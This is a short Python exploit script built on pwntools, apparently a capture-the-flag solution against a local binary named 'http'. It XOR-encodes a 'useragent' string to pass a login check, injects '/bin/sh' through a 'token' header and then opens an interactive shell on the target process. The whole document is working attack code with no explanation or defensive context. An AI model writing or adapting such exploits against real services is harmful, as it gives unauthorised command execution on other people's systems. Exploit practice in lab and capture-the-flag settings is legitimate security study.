from pwn import *
p = process('./http')
def login(data):
        payload = ''
        for i in range(len(data)):
                payload += chr(i^ord(data[i]))
        return payload

io = process('./http')

payload = 'User-Agent: '+login('useragent')
#print payload

payload += 'token: '+'/bin/sh'
payload += '\r\n\r\n'
io.send(payload)
io.interactive()

#gdb.attach(p)
